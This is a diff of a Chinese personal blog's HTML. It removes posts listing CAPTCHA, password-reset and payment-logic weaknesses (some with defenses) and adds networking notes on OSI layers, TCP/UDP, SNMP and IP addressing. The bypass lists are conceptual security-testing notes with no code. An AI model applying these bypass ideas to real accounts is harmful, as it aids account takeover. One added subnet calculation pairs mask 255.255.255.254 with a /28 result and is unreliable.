-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/Web%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">Web安全</span></a>
-        </span>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h1 id="验证码绕过-amp-密码找回漏洞"><a href="#验证码绕过-amp-密码找回漏洞" class="headerlink" title="验证码绕过&amp;密码找回漏洞"></a>验证码绕过&amp;密码找回漏洞</h1><hr>
-<h1 id="验证码"><a href="#验证码" class="headerlink" title="验证码"></a>验证码</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>验证码（CAPTCHA）是“Completely Automated Public Turing test to tell Computers and Humans Apart”（全自动区分计算机和人类的图灵测试）的缩写，是一种区分用户是计算机还是人的公共全自动程序</p>
-<h2 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h2><p>防止恶意破解密码</p>
-<p>防止暴力破解</p>
-<p>刷票</p>
-<p>论坛灌水</p>
-<h2 id="验证码绕过"><a href="#验证码绕过" class="headerlink" title="验证码绕过"></a>验证码绕过</h2><p>设置了验证码并不是完全可靠，在很多情况存在验证码绕过的情况</p>
-<p>前端验证 验证码，但是并没有后端验证</p>
-<p>验证码设置了但是并没有进行校验，导致乱输验证码也能够登录</p>
-<p>验证码可以重复使用</p>
-<p>验证码空值绕过</p>
-<p>验证码干扰过低，轻松使用脚本识别</p>
-<p>验证码会在HTML页面输出</p>
-<p>验证码可控制</p>
-<p>验证码有规律，比如时间戳的后6位</p>
-<p>万能验证码 （000000 直接绕过）</p>
-<p>验证码有时藏在cookie中</p>
-<p>图片验证码，类型太少，容易识别</p>
+<h2 id="网络层"><a href="#网络层" class="headerlink" title="网络层"></a>网络层</h2><p>为传输层实体提供端到端的交换网络数据传送功能，使得传输层摆脱路由选择、交换方式、拥挤控制等网络传输细节；可以为传输层实体建立、维持和拆除一条或多条通信路径；对网络传输中发生的不可恢复的差错予以报告</p>
+<p>网络层将数据链路层提供的帧组成数据包，包中封装有网络层包头，其中含有逻辑地址信息——源站点和目的站点地址的网络地址</p>
+<p><strong>一般的，数据链路层是解决统一网络内节点之间的通信，而网络层主要解决不同子网之间的通信。例如路由选择问题</strong></p>
+<p>在实现网络层功能时，需要解决的主要问题如下：</p>
 <blockquote>
-<p>多次登录后才出现验证码绕过</p>
+<p>寻址</p>
 </blockquote>
-<p>基于session</p>
-<p>基于IP</p>
-<p>基于用户：爆破用户名，而非爆破密码</p>
-<h1 id="密码找回漏洞"><a href="#密码找回漏洞" class="headerlink" title="密码找回漏洞"></a>密码找回漏洞</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>当用户忘记密码时，需要找回密码，有两种方式:</p>
-<p>第一种：找回密码，往邮箱发送明文或密文的密码或验证码（手机短信验证就是往注册时所填写的手机号发送验证码），通过这样的方法判断是否是本人在操作</p>
-<p>第二种：发送重置密码的链接到邮箱</p>
-<p>第三种： 在注册之前，通过预先设定一个密保问题，忘记密码时，通过此密保进行认证，认证成功才能进入密码修改页面</p>
+<p>数据链路层中使用的物理地址（如MAC地址）仅解决网络内部的寻址问题。在不同子网之间通信时，为了识别和找到网络中的设备，每一子网中的设备都会被分配一 个唯一的地址。由于各个子网使用的物理技术可能不同，因此这个地址应当是逻辑地址（如IP地址）</p>
+<blockquote>
+<p>交换</p>
+</blockquote>
+<p>规定不同的交换方式。常见的交换技术有：线路交换技术和存储转发技术，后者包括报文转发技术和分组转发技术</p>
+<blockquote>
+<p>路由算法</p>
+</blockquote>
+<p>当源节点和路由节点之间存在多条路径时，本层可以根据路由算法，通过网络为数据分组选择最佳路径，并将信息从最合适的路径，由发送端传送的接受端。</p>
+<blockquote>
+<p>连接服务</p>
+</blockquote>
+<p>与数据链路层的流量控制不同的是，前者控制的是网络相邻节点间的流量，后者控制的是从源节点到目的节点间的流量。其目的在于防止阻塞，并进行差错检测</p>
+<h2 id="传输层"><a href="#传输层" class="headerlink" title="传输层"></a>传输层</h2><p>为会话层实体提供透明、可靠的数据传输服务，保证端到端的数据完整性；</p>
+<p>选择网络层的最适宜的服务；</p>
+<p>提供建立、维护和拆除传输连接功能</p>
+<p>传输层根据通信子网的特性，最佳的利用网络资源，为两个端系统的会话层之间提供建立、维护和取消传输连接的功能，并以可靠和经济的方式传输数据。</p>
+<p>在这一层，信息的传送单位是报文</p>
+<blockquote>
+<p>主要任务</p>
+</blockquote>
+<p>向用户提供可靠的、端到端的差错和流量控制，保证报文的正确传输</p>
+<blockquote>
+<p>主要作用</p>
+</blockquote>
+<p>向高层屏蔽下层数据通信的具体细节，即向用户透明的传送报文</p>
+<h2 id="应用层"><a href="#应用层" class="headerlink" title="应用层"></a>应用层</h2><p>提供用户服务，即确定进程之间通信的性质，以满足用户需要以及提供网络与用户应用软件之间的接口服务</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/01/09/TCP%E4%B8%8EUDP%E5%8D%8F%E8%AE%AE/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/kilig.gif">
+      <meta itemprop="name" content="kiligwh">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="kilig's Blog">
+      <meta itemprop="description" content="欢迎">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | kilig's Blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2023/01/09/TCP%E4%B8%8EUDP%E5%8D%8F%E8%AE%AE/" class="post-title-link" itemprop="url">TCP与UDP协议</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2023-01-09 17:27:23" itemprop="dateCreated datePublished" datetime="2023-01-09T17:27:23+08:00">2023-01-09</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2023-03-08 12:52:39" itemprop="dateModified" datetime="2023-03-08T12:52:39+08:00">2023-03-08</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E7%BD%91%E7%BB%9C/" itemprop="url" rel="index"><span itemprop="name">网络</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="TCP与UDP协议"><a href="#TCP与UDP协议" class="headerlink" title="TCP与UDP协议"></a>TCP与UDP协议</h1><hr>
+<h1 id="TCP协议"><a href="#TCP协议" class="headerlink" title="TCP协议"></a>TCP协议</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>TCP（Transmission Control Protocol 传输控制协议） 是一种面向连接的、可靠的、基于字节流的传输层通信协议</p>
+<p>由 IETF 的RFC 793定义,TCP 是面向连接的、可靠的流协议</p>
+<h2 id="报文结构"><a href="#报文结构" class="headerlink" title="报文结构"></a>报文结构</h2><p><img src="https://xbxaq.oss-cn-chengdu.aliyuncs.com/typora/image-20220106153245390.png" alt="image-20220106153245390"></p>
+<p>源端口：标识发送方的应用进程</p>
+<p>目的端口：标识接收方的应用进程</p>
+<p>序号(Seq)：保证数据传输的有序性</p>
+<p>确认号(Ack)：对收到的数据进行确认</p>
+<p>Flag字段（8位）</p>
 <ul>
-<li>§密保问题可能容易直接被猜测 （比如很多学校的知道学号和身份证号码就可以重置校园通的密码）</li>
-<li>密保问题答案页面中显示（数据包里面可能自带了密保答案，可能在JS里面）</li>
+<li>ACK：确认号标志，置1表示确认号有效，表示收到对端的特定数据</li>
+<li>RST：复位标志，置1表示拒绝错误和非法的数据包，复位错误的连接</li>
+<li>SYN：同步序号标志，置1表示同步序号，用来建立连接</li>
+<li>FIN：结束标志，置1表示连接将被断开，用于拆除连接</li>
 </ul>
-<p><strong>核心：验证码代表了用户的身份</strong></p>
-<h2 id="密码找回绕过"><a href="#密码找回绕过" class="headerlink" title="密码找回绕过"></a>密码找回绕过</h2><p>验证码发送给前端返回</p>
-<p>验证码无次数限制可爆破</p>
-<p>验证码可控</p>
-<p>直接可跳转到修改密码页面</p>
-<p>越权漏洞–&gt;自己验证码通过改包然后修改他们的密码</p>
+<p>Option字段（可选项）：MSS最大报文段长度，通过置位，协商能承载的TCP数据大小</p>
+<h2 id="传输机制-三次握手"><a href="#传输机制-三次握手" class="headerlink" title="传输机制-三次握手"></a>传输机制-三次握手</h2><p><img src="https://xbxaq.oss-cn-chengdu.aliyuncs.com/typora/image-20220106154944982.png" alt="image-20220106154944982"></p>
+<p><img src="https://xbxaq.oss-cn-chengdu.aliyuncs.com/typora/image-20220106155010392.png" alt="image-20220106155010392"></p>
+<h2 id="传输机制-四次挥手"><a href="#传输机制-四次挥手" class="headerlink" title="传输机制-四次挥手"></a>传输机制-四次挥手</h2><p><img src="https://xbxaq.oss-cn-chengdu.aliyuncs.com/typora/image-20220106155432215.png" alt="image-20220106155432215"></p>
+<p><img src="https://xbxaq.oss-cn-chengdu.aliyuncs.com/typora/image-20220106155444038.png" alt="image-20220106155444038"></p>
+<h2 id="面向字节流"><a href="#面向字节流" class="headerlink" title="面向字节流"></a>面向字节流</h2><p><img src="https://xbxaq.oss-cn-chengdu.aliyuncs.com/typora/image-20220106160119818.png" alt="image-20220106160119818"></p>
+<h2 id="RST标志位"><a href="#RST标志位" class="headerlink" title="RST标志位"></a>RST标志位</h2><p>关闭TCP连接的正常方法是四次挥手，但不是只有四次挥手才能关闭TCP连接</p>
+<blockquote>
+<p>RST 标志位作用</p>
+</blockquote>
+<p>用于复位因某种原因导致的错误连接，也用来拒绝非法数据和请求</p>
+<p>如果接收到RST标志位的时候，通常发生了某些错误</p>
+<p>RST也可能被接收方或者中间设备置位</p>
+<blockquote>
+<p>RST置位的原因</p>
+</blockquote>
+<p>服务器端口没有打开（listen）</p>
+<p>服务器响应太慢，用户终止连接</p>
+<p>网络攻击</p>
+<p>其他</p>
+<h2 id="流量控制-滑动窗口机制"><a href="#流量控制-滑动窗口机制" class="headerlink" title="流量控制-滑动窗口机制"></a>流量控制-滑动窗口机制</h2><p><img src="https://xbxaq.oss-cn-chengdu.aliyuncs.com/typora/image-20220106160408352.png" alt="image-20220106160408352"></p>
+<p><strong>窗口大小决定了在收到确认前可以发送的字节数</strong></p>
+<p><img src="https://xbxaq.oss-cn-chengdu.aliyuncs.com/typora/image-20220106160457113.png" alt="image-20220106160457113"></p>
+<h2 id="可靠传输-停止等待协议"><a href="#可靠传输-停止等待协议" class="headerlink" title="可靠传输-停止等待协议"></a>可靠传输-停止等待协议</h2><blockquote>
+<p>无差错情况</p>
+</blockquote>
+<p><img src="https://xbxaq.oss-cn-chengdu.aliyuncs.com/typora/image-20220106160642771.png" alt="image-20220106160642771"></p>
+<blockquote>
+<p>超时重传</p>
+</blockquote>
+<p><img src="https://xbxaq.oss-cn-chengdu.aliyuncs.com/typora/image-20220106160703271.png" alt="image-20220106160703271"></p>
+<blockquote>
+<p>确认丢失</p>
+</blockquote>
+<p><img src="https://xbxaq.oss-cn-chengdu.aliyuncs.com/typora/image-20220106160736620.png" alt="image-20220106160736620"></p>
+<blockquote>
+<p>确认迟到</p>
+</blockquote>
+<p><img src="https://xbxaq.oss-cn-chengdu.aliyuncs.com/typora/image-20220106160752910.png" alt="image-20220106160752910"></p>
+<h2 id="拥塞控制"><a href="#拥塞控制" class="headerlink" title="拥塞控制"></a>拥塞控制</h2><blockquote>
+<p>网络拥塞</p>
+</blockquote>
+<p>指的是在某段时间，若<strong>对网络中某一资源的需求超过了该资源所能提供的可用部分，网络性能就要变坏</strong></p>
+<p>若<strong>出现拥塞而不进行控制</strong>，整个网络的<strong>吞吐量将随输入负荷的增大而下降</strong></p>
+<blockquote>
+<p>TCP的四种拥塞控制算法</p>
+</blockquote>
+<p>慢开始</p>
+<p>拥塞控制</p>
+<p>快重传</p>
+<p>快恢复</p>
+<blockquote>
+<p>图例</p>
+</blockquote>
+<p><img src="https://xbxaq.oss-cn-chengdu.aliyuncs.com/typora/image-20220106161159940.png" alt="image-20220106161159940"></p>
+<p><img src="https://xbxaq.oss-cn-chengdu.aliyuncs.com/typora/image-20220106161209252.png" alt="image-20220106161209252"></p>
+<h1 id="UDP协议"><a href="#UDP协议" class="headerlink" title="UDP协议"></a>UDP协议</h1><h2 id="概述-1"><a href="#概述-1" class="headerlink" title="概述"></a>概述</h2><p>UDP（User Datagram Protocol，用户数据报协议）一种面向无连接的传输层协议，提供面向事务的简单不可靠信息传送服务，IETE RFC 768是UDP的正式规范</p>
+<p>UDP在IP报文协议的协议号是17</p>
+<h2 id="报文结构-1"><a href="#报文结构-1" class="headerlink" title="报文结构"></a>报文结构</h2><p><img src="https://xbxaq.oss-cn-chengdu.aliyuncs.com/typora/image-20220106162459644.png" alt="image-20220106162459644"></p>
+<h2 id="协议特点"><a href="#协议特点" class="headerlink" title="协议特点"></a>协议特点</h2><p>1、在传输数据之前，不需要进行复杂的三次握手来建立连接</p>
+<p>2、在传输数据时，没有协议间通信流量（确认号），也不需要浪费不必要的处理时间（接收确认信号再发一次）</p>
+<p>3、传输结束后，不再用四次挥手来结束连接</p>
+<p>因为UDP协议是面向无连接的</p>
+<h1 id="TCP和UDP对比总结"><a href="#TCP和UDP对比总结" class="headerlink" title="TCP和UDP对比总结"></a>TCP和UDP对比总结</h1><table>
+<thead>
+<tr>
+<th></th>
+<th>TCP</th>
+<th>UDP</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>可靠性</td>
+<td>可靠</td>
+<td>不可靠</td>
+</tr>
+<tr>
+<td>建立连接</td>
+<td>面向连接</td>
+<td>无连接</td>
+</tr>
+<tr>
+<td>报文</td>
+<td>面向字节流</td>
+<td>面向报文</td>
+</tr>
+<tr>
+<td>传输方式</td>
+<td>点对点</td>
+<td>一对一、一对多、多对多</td>
+</tr>
+<tr>
+<td>传输效率</td>
+<td>低</td>
+<td>高</td>
+</tr>
+<tr>
+<td>流量控制</td>
+<td>有（滑动窗口）</td>
+<td>无</td>
+</tr>
+<tr>
+<td>拥塞控制</td>
+<td>有</td>
+<td>无</td>
+</tr>
+<tr>
+<td>应用场景</td>
+<td>对传输效率要求低，对传输准确性要求高，要求有连接的场景</td>
+<td>对传输效率要求高，对传输准确性要求低</td>
+</tr>
+</tbody></table>
+<h2 id="TCP适用场景"><a href="#TCP适用场景" class="headerlink" title="TCP适用场景"></a>TCP适用场景</h2><p>当网络硬件失效或者负担太重时，数据包可能就会产生丢失、重复、延时、乱序的现象，这些都会导致我们的通信不正常</p>
+<p>如果让应用程序来负担差错控制的工作，无疑将给程序员带来许多复杂的工作，于是，我们使用的通信协议来保证通信的可靠性是非常有必要的</p>
+<p>TCP一般用于文件传输（FTP、HTTP对数据准确性要求高，速度可以相对慢）、发送或接收邮件（POP、SMTP对数据准确性要求高，非紧急应用）、远程登陆（Telnet、SSH对数据准确性有一定要求，有连接的概念）等等</p>
+<h2 id="UDP适用场景"><a href="#UDP适用场景" class="headerlink" title="UDP适用场景"></a>UDP适用场景</h2><p>1、在高效可靠的网络环境中（不需要考虑网络通信不好导致的丢包、乱序、延时、重复等问题），因为UDP是无连接的服务，不用消耗不必要的网络资源（TCP中的协议间通信）和处理时间（预期确认需要的时间），从而效率要高得多</p>
+<p>2、在轻权通信中，当需要传输的数据量很小（可以装在一个IP数据包内）时</p>
+<p> UDP很适合这种客户机向服务器传送简单服务请求的环境，如这类协议包括TFTP、SNMP、DNS、DHCP等</p>
+<p>3、对实时性要求很强的通信中（允许一定量的丢包率时，如赛事直播、视频等）</p>
 
       
     </div>
@@ -1227,7 +713,7 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/12/06/%E6%94%AF%E4%BB%98%E6%BC%8F%E6%B4%9E/">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/01/09/SNMP%E5%8D%8F%E8%AE%AE/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/kilig.gif">
@@ -1245,7 +731,7 @@
     </span>
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
-          <a href="/2022/12/06/%E6%94%AF%E4%BB%98%E6%BC%8F%E6%B4%9E/" class="post-title-link" itemprop="url">支付漏洞</a>
+          <a href="/2023/01/09/SNMP%E5%8D%8F%E8%AE%AE/" class="post-title-link" itemprop="url">SNMP协议</a>
         </h2>
 
         <div class="post-meta-container">
@@ -1256,14 +742,14 @@
       </span>
       <span class="post-meta-item-text">发表于</span>
 
-      <time title="创建时间：2022-12-06 16:37:00" itemprop="dateCreated datePublished" datetime="2022-12-06T16:37:00+08:00">2022-12-06</time>
+      <time title="创建时间：2023-01-09 09:46:55" itemprop="dateCreated datePublished" datetime="2023-01-09T09:46:55+08:00">2023-01-09</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2023-03-07 21:30:28" itemprop="dateModified" datetime="2023-03-07T21:30:28+08:00">2023-03-07</time>
+      <time title="修改时间：2023-03-08 12:52:28" itemprop="dateModified" datetime="2023-03-08T12:52:28+08:00">2023-03-08</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -1271,7 +757,7 @@
       </span>
       <span class="post-meta-item-text">分类于</span>
         <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/Web%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">Web安全</span></a>
+          <a href="/categories/%E7%BD%91%E7%BB%9C/" itemprop="url" rel="index"><span itemprop="name">网络</span></a>
         </span>
     </span>
 
@@ -1285,24 +771,15 @@
     
     
     <div class="post-body" itemprop="articleBody">
-          <h1 id="支付漏洞"><a href="#支付漏洞" class="headerlink" title="支付漏洞"></a>支付漏洞</h1><hr>
-<h2 id="快捷支付原理"><a href="#快捷支付原理" class="headerlink" title="快捷支付原理"></a>快捷支付原理</h2><p>商户网站接收支付结果有两种方式</p>
-<h3 id="浏览器跳转"><a href="#浏览器跳转" class="headerlink" title="浏览器跳转"></a>浏览器跳转</h3><p>基于用户访问的浏览器，如果用户在银行页面支付成功后，直接关闭了页面，并未等待银行跳转到支付结果页面，那么商户的网站就收不到支付结果的通知，导致支付结果难以处理。而且浏览器端数据容易被篡改而降低安全性</p>
-<h3 id="服务器端异步通知"><a href="#服务器端异步通知" class="headerlink" title="服务器端异步通知"></a>服务器端异步通知</h3><p>该方法是支付公司服务器后台直接向用户指定的异步通知URL发送参数，采用POST&#x2F;GET的方式</p>
-<p>商户网站接收异步参数的URL对应的程序中，要对支付公司返回的支付结果进行签名验证，成功后进行支付逻辑处理。如验证金额、订单信息是否与发起支付时一致，验证正常则对订单进行状态处理或为用户进行网站内入账等</p>
-<h2 id="常见支付漏洞"><a href="#常见支付漏洞" class="headerlink" title="常见支付漏洞"></a>常见支付漏洞</h2><p>修改支付的价格（支付三部曲–订购、订单、付款）</p>
-<p>修改支付状态</p>
-<p>修改订单数量</p>
-<p>修改复数值（优惠卷）</p>
-<h2 id="支付漏洞挖掘"><a href="#支付漏洞挖掘" class="headerlink" title="支付漏洞挖掘"></a>支付漏洞挖掘</h2><p>找到关键的数据包</p>
-<p>分析数据包</p>
-<p>不按套路出牌</p>
-<p>PC端、WAP端、APP</p>
-<h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><p>后端检查每一项的值，包括支付状态</p>
-<p>校验价格、数量参数，比如产品数量只能为正整数，并限制购买数量</p>
-<p>与第三方支付平台检查，实际支付的金额是否与订单金额一致</p>
-<p>支付参数进行MD5 加密、解密、数字签名及验证，这个可以有效的避免数据修改、重发攻击中的各种问题</p>
-<p>金额超过阈值，进行人工审核</p>
+          <h1 id="SNMP协议"><a href="#SNMP协议" class="headerlink" title="SNMP协议"></a>SNMP协议</h1><hr>
+<p>随着网络技术的飞速发展，企业中的网络设备数量成几何级数增长，网络设备的种类也越来越多，这使得企业网络的管理十分繁杂</p>
+<p>SNMP（Simple Network Management Protocol）可以实现对不同种类和不同厂商的网络设备进行统一管理，大大提升了网络管理的效率</p>
+<p>由一组网络管理的标准组成，包含一个应用层协议（application layer protocol）、数据库模型（database schema）和一组资源对象</p>
+<p>该协议能够支持网络管理系统，用以监测连接到网络上的设备是否有任何引起管理上关注的情况</p>
+<p>该协议是互联网工程工作小组（IETF，Internet Engineering Task Force）定义的internet协议簇的一部分</p>
+<p>SNMP的目标是管理互联网Internet上众多厂家生产的软硬件平台，因此SNMP受Internet标准网络管理框架的影响也很大</p>
+<p>SNMP已经出到第三个版本的协议，其功能较以已经大大地加强和改进了</p>
+<p>SNMP协议端口是UDP161，SNMP TRAP 端口是UDP162。</p>
 
       
     </div>
@@ -1329,7 +806,7 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/12/03/%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E/">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/01/08/IP%E5%8D%8F%E8%AE%AE/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/kilig.gif">
@@ -1347,7 +824,7 @@
     </span>
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
-          <a href="/2022/12/03/%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E/" class="post-title-link" itemprop="url">越权漏洞</a>
+          <a href="/2023/01/08/IP%E5%8D%8F%E8%AE%AE/" class="post-title-link" itemprop="url">IP协议</a>
         </h2>
 
         <div class="post-meta-container">
@@ -1358,14 +835,14 @@
       </span>
       <span class="post-meta-item-text">发表于</span>
 
-      <time title="创建时间：2022-12-03 18:36:25" itemprop="dateCreated datePublished" datetime="2022-12-03T18:36:25+08:00">2022-12-03</time>
+      <time title="创建时间：2023-01-08 16:10:13" itemprop="dateCreated datePublished" datetime="2023-01-08T16:10:13+08:00">2023-01-08</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2023-03-07 21:30:23" itemprop="dateModified" datetime="2023-03-07T21:30:23+08:00">2023-03-07</time>
+      <time title="修改时间：2023-03-08 12:52:23" itemprop="dateModified" datetime="2023-03-08T12:52:23+08:00">2023-03-08</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -1373,7 +850,7 @@
       </span>
       <span class="post-meta-item-text">分类于</span>
         <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/Web%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">Web安全</span></a>
+          <a href="/categories/%E7%BD%91%E7%BB%9C/" itemprop="url" rel="index"><span itemprop="name">网络</span></a>
         </span>
     </span>
 
@@ -1387,13 +864,39 @@
     
     
     <div class="post-body" itemprop="articleBody">
-          <h1 id="越权漏洞"><a href="#越权漏洞" class="headerlink" title="越权漏洞"></a>越权漏洞</h1><hr>
-<h2 id="越权漏洞-1"><a href="#越权漏洞-1" class="headerlink" title="越权漏洞"></a>越权漏洞</h2><p>由于没有对用户权限进行严格的判断，导致低权限的账号（如普通账号）可以去完成高权限账号（如超级管理员）范围内的操作</p>
-<h2 id="平行越权"><a href="#平行越权" class="headerlink" title="平行越权"></a>平行越权</h2><p>A用户和B用户属于同一级别用户，但各自不能操作对方个人信息，A用户如果越权操作B用户的个人信息的情况，就属于平行越权操作</p>
-<h2 id="垂直越权"><a href="#垂直越权" class="headerlink" title="垂直越权"></a>垂直越权</h2><p>A用户权限高于B用户，B用户越权操作A用户的权限，这一情况就属于垂直越权</p>
-<p>越权漏洞属于逻辑漏洞，是由于权限校验的逻辑不够严谨严格</p>
-<p>每个应用系统其用户对应的权限是根据其业务功能划分，而每个企业的业务又都是不一样的，因此越权漏洞很难通过扫描工具发现，往往需要通过手工进行测试</p>
-<h2 id="交叉越权"><a href="#交叉越权" class="headerlink" title="交叉越权"></a>交叉越权</h2><p>既可以平行越权又可以垂直越权</p>
+          <h1 id="IP协议"><a href="#IP协议" class="headerlink" title="IP协议"></a>IP协议</h1><hr>
+<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>IP地址唯一标识一台网络设备，由32个二进制位组成</p>
+<p>IP地址分为两部分：网络部分和主机部分</p>
+<p>IP地址通常采用点分十进制的格式标识。如：10.1.1.1</p>
+<p><img src="https://xbxaq.oss-cn-chengdu.aliyuncs.com/typora/image-20220106171046769.png" alt="image-20220106171046769"></p>
+<h2 id="私有IP地址"><a href="#私有IP地址" class="headerlink" title="私有IP地址"></a>私有IP地址</h2><blockquote>
+<p>私有IP地址</p>
+</blockquote>
+<p>10.0.0.0 - 10.255.255.255</p>
+<p>172.16.0.0 - 172.31.255.255</p>
+<p>192.168.0.0. - 192.168.255.255</p>
+<blockquote>
+<p>保留地址</p>
+</blockquote>
+<p>169.254.0.0 - 169.254.255.255</p>
+<p>作用：在Windows环境下，计算机无法通过DHCP自动获取地址时用于临时通信</p>
+<blockquote>
+<p>图例</p>
+</blockquote>
+<p><img src="https://xbxaq.oss-cn-chengdu.aliyuncs.com/typora/image-20220106171316427.png" alt="image-20220106171316427"></p>
+<h2 id="子网掩码"><a href="#子网掩码" class="headerlink" title="子网掩码"></a>子网掩码</h2><p>掩码用来标识IP地址的网络部分和主机部分</p>
+<p>32 bits长，网络部分为连续1，主机部分为连续0</p>
+<p>一般用点分十进制表示，如：</p>
+<ul>
+<li>A类地址相当于掩码：255.0.0.0</li>
+<li>B类地址相当于掩码：255.255.0.0</li>
+<li>C类地址相当于掩码：255.255.255.0</li>
+</ul>
+<p><img src="https://xbxaq.oss-cn-chengdu.aliyuncs.com/typora/image-20220106171452974.png" alt="image-20220106171452974"></p>
+<h2 id="网段及地址范围计算"><a href="#网段及地址范围计算" class="headerlink" title="网段及地址范围计算"></a>网段及地址范围计算</h2><p>192.168.1.7 + 255.255.255.254 &#x3D; 192.168.1.0</p>
+<p><img src="https://xbxaq.oss-cn-chengdu.aliyuncs.com/typora/image-20220106171553635.png" alt="image-20220106171553635"></p>
+<p>IP地址所在网段：192.168.1.0&#x2F;28</p>
+<p>网段地址范围：192.168.1.0 - 192.168.1.15</p>
 
       
     </div>
@@ -1420,7 +923,7 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/12/01/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/01/07/ICMP%E5%8D%8F%E8%AE%AE/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/kilig.gif">
@@ -1438,7 +941,7 @@
     </span>
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
-          <a href="/2022/12/01/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/" class="post-title-link" itemprop="url">文件包含漏洞</a>
+          <a href="/2023/01/07/ICMP%E5%8D%8F%E8%AE%AE/" class="post-title-link" itemprop="url">ICMP协议</a>
         </h2>
 
         <div class="post-meta-container">
@@ -1449,14 +952,14 @@
       </span>
       <span class="post-meta-item-text">发表于</span>
 
-      <time title="创建时间：2022-12-01 20:35:29" itemprop="dateCreated datePublished" datetime="2022-12-01T20:35:29+08:00">2022-12-01</time>
+      <time title="创建时间：2023-01-07 20:35:36" itemprop="dateCreated datePublished" datetime="2023-01-07T20:35:36+08:00">2023-01-07</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2023-03-07 23:25:00" itemprop="dateModified" datetime="2023-03-07T23:25:00+08:00">2023-03-07</time>
+      <time title="修改时间：2023-03-08 12:52:19" itemprop="dateModified" datetime="2023-03-08T12:52:19+08:00">2023-03-08</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -1464,7 +967,7 @@
       </span>
       <span class="post-meta-item-text">分类于</span>
         <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/Web%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">Web安全</span></a>
+          <a href="/categories/%E7%BD%91%E7%BB%9C/" itemprop="url" rel="index"><span itemprop="name">网络</span></a>
         </span>
     </span>
 
@@ -1478,69 +981,81 @@
     
     
     <div class="post-body" itemprop="articleBody">
